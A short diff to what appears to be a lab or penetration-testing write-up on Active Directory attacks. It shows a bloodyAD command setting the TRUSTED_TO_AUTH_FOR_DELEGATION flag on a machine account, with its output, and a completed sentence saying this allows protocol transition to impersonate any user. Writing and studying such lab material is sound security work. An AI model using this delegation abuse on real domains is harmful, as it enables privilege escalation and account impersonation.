@@ -820,4 +820,5 @@ bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -u 'svc_delegate' -p '
 [+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to HELPDESK01$'s userAccountControl
 ```
 
-Then ill add the `TRUSTED_TO_AUTH_FOR_DELEGATION`, this will allow protocol transition making the 
+Then ill add the `TRUSTED_TO_AUTH_FOR_DELEGATION`, this will allow protocol transition making the attack much easier since ill be able to impersonate any user i want
+
